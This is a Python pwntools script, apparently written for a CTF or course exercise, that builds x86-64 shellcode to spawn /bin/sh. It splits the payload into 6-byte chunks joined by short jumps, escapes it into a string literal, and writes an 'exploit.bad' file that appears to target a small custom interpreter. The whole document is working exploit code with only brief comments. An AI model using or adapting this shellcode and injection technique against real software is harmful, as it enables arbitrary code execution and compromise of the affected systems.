from pwn import *
from pwnlib import asm

context.arch = 'amd64'

# Create a NOP sled into our code
# (for my laziness)
nop = asm.asm('nop')
# note I did not use asm() here for the jump, to get a short jump
advance = b'\xEB\x06'
nops = (((nop * 6) + advance) * 4)

# ok, so we need to execute everything in 6-byte segments
# which will be a bit odd

# based on: https://www.exploit-db.com/shellcodes/46907

shellcode = nops;

# clear rsi
shellcode += asm.asm('xor rsi, rsi')        # 3 bytes
shellcode += asm.asm('push rsi')            # 1 byte
shellcode += nop * 2                        # 2 bytes
shellcode += advance                        # <advance>

# clear rdi
shellcode += asm.asm('xor rdi, rdi')        # 3 bytes

# we need to get 0x68732f2f6e69622f into rdi
# i'll do this by using rax to shift-and-mask

# clear rax
shellcode += asm.asm('xor rax, rax')        # 3 bytes
shellcode += advance                        # <advance>

shellcode += asm.asm('mov eax, 0x68732f2f') # 5 bytes
shellcode += nop                            # 1 byte
shellcode += advance                        # <advance>

shellcode += asm.asm('shl rax, 32')         # 4 bytes
shellcode += nop * 2                        # 2 bytes
shellcode += advance                        # <advance>

shellcode += asm.asm('or rdi, rax')         # 3 bytes
shellcode += nop * 3                        # 3 bytes
shellcode += advance                        # <advance>

shellcode += asm.asm('mov eax, 0x6e69622f') # 5 bytes
shellcode += nop                            # 1 byte
shellcode += advance                        # <advance>

shellcode += asm.asm('or rdi, rax')         # 3 bytes
shellcode += asm.asm('push rdi')            # 1 byte
shellcode += asm.asm('push rsp')            # 1 byte
shellcode += asm.asm('pop rdi')             # 1 byte
shellcode += advance                        # <advance>

shellcode += asm.asm('push 59')             # 2 bytes
shellcode += asm.asm('pop rax')             # 1 byte
shellcode += asm.asm('cdq')                 # 1 byte
shellcode += asm.asm('syscall')             # 2 bytes

# convert shellcode into a string
s = ""
for byt in shellcode:
    if int(byt) == 0:
        # BAD! nulls will NOT work
        raise "NULL bytes are not allwed"
    # neat trick: convert some of them into chars
    if byt in b'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890':
        s += chr(byt)
    else:
        s += "\\x{0:02x}".format(byt)


# put AT LEAST 8 chars of padding on the end to ensure
# "wide-copy" technique is used for string literal
s += "p_nack//"


# construct the file
with open('exploit.bad', mode='w') as fout:
    fout.write("LOADI 2 45;\n")
    fout.write("JUMP 2;\n")
    fout.write("LOADS 1 \"" + s + "\";\n")

